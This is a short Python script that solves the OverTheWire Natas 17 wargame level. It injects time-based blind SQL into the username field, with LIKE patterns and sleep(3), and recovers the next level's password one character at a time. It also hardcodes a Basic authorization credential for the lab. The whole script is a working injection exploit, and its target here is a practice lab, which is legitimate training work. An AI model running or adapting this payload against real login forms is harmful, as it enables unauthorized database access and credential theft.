import requests
import string

def checkPassword(password):
    print(f'Checking {password} ... ')
    headers = {'Authorization': 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='}
    data = {'username': f'natas18" and password collate latin1_general_cs like "{password}" and sleep(3) #'}
    r = requests.post('http://natas17.natas.labs.overthewire.org', data=data, headers=headers)
    return r.elapsed.total_seconds() > 2

knowPassword = ''
while True:
    for ch in string.printable:
        if checkPassword(knowPassword + ch + '%'):
            knowPassword += ch
            flag = True
            break
    if checkPassword(knowPassword):
        print(f'Complete: {knowPassword}')
        break